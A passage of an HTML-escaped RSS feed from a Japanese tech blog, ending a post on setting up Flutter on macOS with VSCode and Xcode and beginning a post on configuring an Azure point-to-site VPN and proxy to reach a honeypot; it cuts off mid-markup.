&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token environment constant&quot;&gt;$PATH&lt;/span&gt;:&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;Flutterの&lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;先ほど同様&lt;code class=&quot;language-text&quot;&gt;where&lt;/code&gt;コマンドで反映を確認できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 583px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/aff82369104cc9c9f172cd8ce0a5db81/9fc4b/image-20220308225050712.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 65.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABUklEQVQ4y9WT22qDQBCGfYcUT7tW6yGGNKHFqKs1B6NRcuqF71Ha97/6u7tgUoRACr3pxYcwO/PN7OIotVfiUDHMYoZ5kGA2Sfg3wjw5gK06rNIaLCqRvKyRLbbYZHvEsyWPrbBvj6irFqfDO6qywefHF5S3V36w36BqKjS7HdI0RZ4xrLdbSVluOCWm0ylc94njwnZsUMuCaRIQAaEYjR5QFEsoKe9+PB1xPp3RdR3qukbTtlgWBZI4BmOZbDIeh/B9H7pucAGRUEolFpfruoYoWkDxHp8RTgKE4QRBEMC2bTmFSDIMg09hXugFQ0SuqqrIsgwK0TwYpiaLBaKzKP45QU8fG571wjzPoVDd5+9Bbna/Jb0pJLrHg6Z82Hul/12o/bnQvQrvZNh8cOWrkFByF5SSy88t6IWMMSim6soESqxfTSgkjuPwWkuuodgUsWXf6nBsURw1lYEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/aff82369104cc9c9f172cd8ce0a5db81/8ac56/image-20220308225050712.webp 240w,
/static/aff82369104cc9c9f172cd8ce0a5db81/d3be9/image-20220308225050712.webp 480w,
/static/aff82369104cc9c9f172cd8ce0a5db81/92613/image-20220308225050712.webp 583w&quot;
              sizes=&quot;(max-width: 583px) 100vw, 583px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/aff82369104cc9c9f172cd8ce0a5db81/8ff5a/image-20220308225050712.png 240w,
/static/aff82369104cc9c9f172cd8ce0a5db81/e85cb/image-20220308225050712.png 480w,
/static/aff82369104cc9c9f172cd8ce0a5db81/9fc4b/image-20220308225050712.png 583w&quot;
            sizes=&quot;(max-width: 583px) 100vw, 583px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/aff82369104cc9c9f172cd8ce0a5db81/9fc4b/image-20220308225050712.png&quot;
            alt=&quot;image-20220308225050712&quot;
            title=&quot;image-20220308225050712&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;vscodeのセットアップ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#vscode%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot; aria-label=&quot;vscodeのセットアップ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;VSCodeのセットアップ&lt;/h3&gt;
&lt;p&gt;MacOSにインストールしたVSCodeにもFlutterプラグインをインストールします。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 948px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/94a257e4cfd4bdafbadd06bcdd551af7/ecf19/image-20220308225257732.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 49.583333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAACIUlEQVQoz0WS227TQBRF8xWoTXOPr2M78W1sx5ckTZyWVtDygBAC8QWIVyTeeUX8DP+3OJkU8bB1xppztvfeZwbPhy26qyh1TVFs0FqQV+RZSVXWVFVjsO927HZH8pe7c/3Xq/UL5DxIMk2eJDJckEhdx4L1muVyia98fNfBspbYacViPsd2HHO3WCyYTCZMZzPG0zmT6ZSZnAe5zon711TdgUJrIYupmg5HBofDIWMZuv3+i/zzV5Tn8/jwSJomghTPV7jLCbE7kh/bpneg0wwra0m7e059T15U7N59xg3X3Fy9wl6lbH//Ifz4jfnCZtX0BGFIFEXE4iZUHulKEYWBUTyoNzVLKyRNNP3pxKaSXA6P2H7AaDRidnPFRPdcV89YQUzUv8eyHeZi/2x3Zuqc8XhsMDg9vEXVR9Kq5Xa/p64b9P4e21PciGVfBSjHwpEcle/h2QvJ1CIIAhPLWanv+5Lf9KIwlyz8uke3B+5EYdu0lP0TjoouhNKc5lqqMorPQxdcFNm2xLBaoZS6KEzkw++2lMeeu/4kCmvq/g2uCmUp19K8Jis7qk0jz0pTlBWFxJKUrVF/JizL0rwMs+VEgnUjh2pXc7w9ylCJ7p9xgxXD6yvzlNq2kRqTiZsozohFROiK9elICB1x1fwnjCPZ2OGJYnti13WGcNPtcVzXWM6yzDQrySyUvELPIrv7gPfpJ+2XHySrANfzTK7nSP4CxOE4QnFmYMMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/94a257e4cfd4bdafbadd06bcdd551af7/8ac56/image-20220308225257732.webp 240w,
/static/94a257e4cfd4bdafbadd06bcdd551af7/d3be9/image-20220308225257732.webp 480w,
/static/94a257e4cfd4bdafbadd06bcdd551af7/af3d9/image-20220308225257732.webp 948w&quot;
              sizes=&quot;(max-width: 948px) 100vw, 948px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/94a257e4cfd4bdafbadd06bcdd551af7/8ff5a/image-20220308225257732.png 240w,
/static/94a257e4cfd4bdafbadd06bcdd551af7/e85cb/image-20220308225257732.png 480w,
/static/94a257e4cfd4bdafbadd06bcdd551af7/ecf19/image-20220308225257732.png 948w&quot;
            sizes=&quot;(max-width: 948px) 100vw, 948px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/94a257e4cfd4bdafbadd06bcdd551af7/ecf19/image-20220308225257732.png&quot;
            alt=&quot;image-20220308225257732&quot;
            title=&quot;image-20220308225257732&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次の手順も全く同じです。&lt;/p&gt;
&lt;p&gt;テストアプリのプロジェクトを作成します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 831px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/91a656eef0980b445a7858e08eb4eb31/5b4a1/image-20220308225748275.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB8klEQVQoz2WSyZKbQBBE9R8j1t6gQeyLAGlG4PFhLv7/v0lnt+wJK3x4gSg1WVWZffo1f2E/bpiHd8zthqldMXcbFrJ2K9b5J6bxwDhO2LYN12Xxz2EcUdU1mqbxDP2AYRhw+nx8oe0bTPOMtmthiwJCSkilIEhZV6w30FpDsq5Zcyip/LsQwpOmT059veJSXbAsKzuMyDLLgxpKaQgeSIguO9SXEoWWMDJFrgQyokSKIAgQhuE3p6HZUF4KL6i1YZfUd3YkSYI4TmBLi77vkGQ5ZG4QhxHOb2//iXlBN2HbdZjnFXXdIs8LUsLakqKKgjESIRFxzVgQV1MSsVaI+J8TDYJ/BEcG0dPM232nuT2KovKUZe3XdoKptlB9C83GBQMwXF+yubPKGP0yqRd0K7sUszynwfKP2dKv7w1nPWM42nI6w3eSZQzG/Va0JYm+RU9dfaVgidvt7kNxnrlV3XQuNUHjJYOalg3VdUC5TsgLy6S19/h8Pr9OWBUDLhTcHwfu93eu7Xy0XvQpKBDxYM0JTWWRtyWMFgijwE+WiBhRFCI4B16YgiMaevH4eOA4fvi0jcleBaMIccqPlfMz8UiTegTxa6dP8eeEvPH78Yl9P/zVcf79XVkx3ZDXROgURW9gO0M/FWyrkTeaASn/dLjab8MKReoyCRHVAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/91a656eef0980b445a7858e08eb4eb31/8ac56/image-20220308225748275.webp 240w,
/static/91a656eef0980b445a7858e08eb4eb31/d3be9/image-20220308225748275.webp 480w,
/static/91a656eef0980b445a7858e08eb4eb31/6d405/image-20220308225748275.webp 831w&quot;
              sizes=&quot;(max-width: 831px) 100vw, 831px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/91a656eef0980b445a7858e08eb4eb31/8ff5a/image-20220308225748275.png 240w,
/static/91a656eef0980b445a7858e08eb4eb31/e85cb/image-20220308225748275.png 480w,
/static/91a656eef0980b445a7858e08eb4eb31/5b4a1/image-20220308225748275.png 831w&quot;
            sizes=&quot;(max-width: 831px) 100vw, 831px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/91a656eef0980b445a7858e08eb4eb31/5b4a1/image-20220308225748275.png&quot;
            alt=&quot;image-20220308225748275&quot;
            title=&quot;image-20220308225748275&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;事前にApp StoreからXCodeをインストールしておくことで、デバイス設定にiOSのエミュレータが追加されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 614px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bc30afca0d29dcd4ab4620088e2b9fc6/e9131/image-20220308225914449.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 29.583333333333332%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABPUlEQVQY003Oy07CUBSF4T6DykRo6YVajtxaSmlLkVJokRhFSTRxgBodGR0w8/V/TytRB1/WXtknOVuJggui8X8z4jCtFMtrVvkN+eKKy2LDenVLlq4Jx+V+TiTFv7IqlXi+ZFLKcpk5cbrAj6eV8TStBMmsyvBCdjn7ccKoepPghhO8UpTQGQYoYvNOuPuid79H3H1SL944mu2oZS+czJ85SZ/+8jDXpGM514tXgsc9ve0Hg4c99WSL4ocJ6XLFZJYxHE8Q/SFO18NwupiS1e5hif5P/lPu7I5H10849yJ5XYzldFDajoPnuhV3MMAfenjydMc5Qzg2ZrOJ3lDRmxqG3jzQMcpu2uht+XnbxRAjdN1EsVo2ltVCN0xUVUXVNGzRIS+muEGE2e1jjzyEEL97VdUOKXujfnCKJvs3N8u/V5glfXYAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/bc30afca0d29dcd4ab4620088e2b9fc6/8ac56/image-20220308225914449.webp 240w,
/static/bc30afca0d29dcd4ab4620088e2b9fc6/d3be9/image-20220308225914449.webp 480w,
/static/bc30afca0d29dcd4ab4620088e2b9fc6/5316f/image-20220308225914449.webp 614w&quot;
              sizes=&quot;(max-width: 614px) 100vw, 614px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/bc30afca0d29dcd4ab4620088e2b9fc6/8ff5a/image-20220308225914449.png 240w,
/static/bc30afca0d29dcd4ab4620088e2b9fc6/e85cb/image-20220308225914449.png 480w,
/static/bc30afca0d29dcd4ab4620088e2b9fc6/e9131/image-20220308225914449.png 614w&quot;
            sizes=&quot;(max-width: 614px) 100vw, 614px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/bc30afca0d29dcd4ab4620088e2b9fc6/e9131/image-20220308225914449.png&quot;
            alt=&quot;image-20220308225914449&quot;
            title=&quot;image-20220308225914449&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これを選択した状態でF5キーを押すことでiPhoneアプリも同じFlutterのソースコードからビルドすることができました。&lt;/p&gt;
&lt;span class=&quot;gatsby-resp-image-wrapper&quot; style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 480px; &quot;&gt;
      &lt;a class=&quot;gatsby-resp-image-link&quot; href=&quot;/static/64c373c1879724f8ad2281a95b30acb2/e85cb/image-20220308230039990.png&quot; style=&quot;display: block&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
    &lt;span class=&quot;gatsby-resp-image-background-image&quot; style=&quot;padding-bottom: 199.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAoCAYAAAD+MdrbAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFKElEQVRIx62VXUxTZxjHeyVG6AdtaWnLV1v6/QEtrYjyIai0tMXoEt1uJqhTNO5iW5Zl2cwWGO7CuLk4jW4aFMeN2ebtLnazZDeyJQrLXMwkWo2bQCkfgxYKtP897wsIKDNlcJL/ed5zzvv+zvOc5znPK7CpP0Gx+igMucdgVrXAqX0TjqITsJNMmhbSUdIRLiPXYZjVB0hNMGuaSQdh0RwiHUSJuh0CvWof9lisCNaVQOspwa6qRvh37cW28p3Q5TtI9mXSaqxw2SphNZTD7aiB07INNmM5TDonzLmHCZi7ByZVHUwF9dDlbYcxrxbG/Fro1DWk7dBp5qWuJlVxGfKqoVdt5daQvwN6dR10qmpYlMch0Cleg172NhSZZohEWgilZkjkZojFhRCLCkiFXBJRPpdYqIFYQtc5NI/uZ22QQyFywyI/DqfiJARG9evQZHsh3HkU1lN3YGn7FXntf0JUS28TCFZUTtMVaE7dh+P9H9Fyoh0F7koUSLfDrWyFoDinFhLtNuSfHYW3YxqeyxPIPzcFddt9SHa3QxRshTjUxiUKfATpq+eRdyaKonMxWC/Fsf/bBPY3t0K6SYlS1XsQFIrdkDpC0F+Io+B0P/SfR+C5OATXpTGUXk3B25mC++q8rqXg6phF2cVhOM4PQXtmAOqz4yh69yco5DrYFccg0EpcEFkDyP4sDumng1CeHsLmr0dQcXkYzi8jqPgqAu/FCJznI9h8KYISsluvjGDL5RGaH4H89BiEJ+9BrLLDKX8DAlVWKTyVAXz/ewxd3f3o+iWCzluDXNe7I7g2P+7sXm6vk+3qHsCNO2O48MNvKCi0wSYjoCzThMZgCPyYjdMpkb6SU3xZ9GkYJr0dVinVYU6mDQ3+OeB4LI745FTamohPYiaZwoPwQxgIaGNARaYTAX8jB8bjcUxNTaWtyclJpFLAo0cPYeRACjlHaEKgIbQMmEgk0tIiMExA9g1ZyEIjAoG1AFNzQIMZNnkzhZxlXaOHS4CyJgiUQts6Ag8QUGRep5BNc8Dc9QIWW2CX0TfUiEoRbGhcY5bnysbByqZI7CHg7nUBlkiPUIOVlL0A/L+FXSIjoD570UM2YWZmJm1NT08vA5ay5lAsXfRwbHQMg4ODGBoa4nZgYAD9/f2IRCL8mmnpmD3nSXkc5kAXAxplZQjNA8fHxzksGo0+WzQ8PIxwOExePMLo6OizZ8wy+AKQdRs3A5pyFoErhcwWME8YIJlM8jAXnrHELITMgGUMaFG4EQq8PCkLWX1ZUhjQw5qDTelGY+DFslkKe368UtkwoJcB7bkuAq5c2KsFbmZAq8L5n8B0Czs8D9wiO0S/3iYTgv7QmoFmAm5lQGWGAQHf+gAr54DF6waslh2kjp2hJ2AwbeDSBMUJmKRdjwEtBNzBPFRk6FYNXLAziUm+7uE8sJ5vo6sELsCSMwn0j8QRHpnFX0/CsOjsaODbaIYWDav0cJpsjDb5xm+GYbkwgZu37sNjdsAnIQ/lG7S00c8BY7HYC78We8ky0T0G/GcihoaOpzB8EcWNn/+A1+JEvZi+oXyjFnU1Oznw+f93pSOVSvIXsZAf/B3FvacxPHn8AEWqYgSlLVQ2EhNkEhVu3vyOL2DdhHUVBr179y56enrQ29vLdfv2bfT19fEONE3dBslZvubDjz+AihzbJ3+HkkK7nmSjATKpHFVVlfD7/fD5fKivr0d5eTk8Hg+8Xi8XG1dUVDyb4/P5Uep2QZ6lRJVkL17Jfgv/AqPKgZP3NtmlAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;&gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source srcset=&quot;/static/64c373c1879724f8ad2281a95b30acb2/8ac56/image-20220308230039990.webp 240w,
/static/64c373c1879724f8ad2281a95b30acb2/d3be9/image-20220308230039990.webp 480w&quot; sizes=&quot;(max-width: 480px) 100vw, 480px&quot; type=&quot;image/webp&quot;&gt;
          &lt;source srcset=&quot;/static/64c373c1879724f8ad2281a95b30acb2/8ff5a/image-20220308230039990.png 240w,
/static/64c373c1879724f8ad2281a95b30acb2/e85cb/image-20220308230039990.png 480w&quot; sizes=&quot;(max-width: 480px) 100vw, 480px&quot; type=&quot;image/png&quot;&gt;
          &lt;img class=&quot;gatsby-resp-image-image&quot; src=&quot;/static/64c373c1879724f8ad2281a95b30acb2/e85cb/image-20220308230039990.png&quot; alt=&quot;image-20220308230039990&quot; title=&quot;image-20220308230039990&quot; loading=&quot;lazy&quot; style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;同じようなクロスコンパイルできるスマホアプリのフレームワークでXamarinやReact Nativeも使ったことがあるのですが、Flutterが断トツで簡単にセットアップできた気がします。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[仮想ネットワークゲートウェイでAzureにVPN接続してクラウドプロキシっぽい環境を作ったメモ]]></title><link>https://kashiwaba-yuki.com/azure-vpn-setup</link><guid isPermaLink="false">https://kashiwaba-yuki.com/azure-vpn-setup</guid><pubDate>Fri, 04 Mar 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;先日&lt;a href=&quot;/honeypot-setup-on-azure&quot;&gt;こちらの記事&lt;/a&gt;でAzure上にハニーポットを構築した話を書きましたが、アクセスコントロール的にもセキュリティ的にも、ハニーポットへの接続はVPNを使った方がよさそうでしたので、Azureの仮想ネットワークゲートウェイを使って仮想ネットワークに対してP2S VPN接続を構成しました。&lt;/p&gt;
&lt;p&gt;ついでにAzureVM上のサーバをクラウドプロキシとして使えば色々セキュアなのでは？(浅い)と思ったので、VPN接続するAzureの仮想ネットワーク上にプロキシサーバも構築してみました。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%81%A8%E4%BB%AE%E6%83%B3%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%B2%E3%83%BC%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A4%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;仮想ネットワークと仮想ネットワークゲートウェイを作成する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AA%E3%83%AC%E3%82%AA%E3%83%AC%E3%83%AB%E3%83%BC%E3%83%88%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%81%A8%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%82%92%E7%94%9F%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;オレオレルート証明書とクライアント証明書を生成する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#p2s-vpn%E6%8E%A5%E7%B6%9A%E3%82%92%E6%A7%8B%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;P2S VPN接続を構成する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#windows%E3%81%A7vpn%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;WindowsでVPNを設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#azurevm%E4%B8%8A%E3%81%AB%E3%83%97%E3%83%AD%E3%82%AD%E3%82%B7%E3%82%92%E6%A7%8B%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;AzureVM上にプロキシを構成する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%8E%A5%E7%B6%9A%E3%83%86%E3%82%B9%E3%83%88&quot;&gt;接続テスト&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;仮想ネットワークと仮想ネットワークゲートウェイを作成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%81%A8%E4%BB%AE%E6%83%B3%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%B2%E3%83%BC%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A4%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;仮想ネットワークと仮想ネットワークゲートウェイを作成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;仮想ネットワークと仮想ネットワークゲートウェイを作成する&lt;/h2&gt;
&lt;p&gt;まずは仮想ネットワークを作成します。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;172.16.0.0/20&lt;/code&gt;の仮想ネットワークを作成し、その中に仮想マシンを割り当てるサブネットを作成しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 764px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9763efe3f469ddd0448c1c516dd153a1/f3c12/image-20220304201840502.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
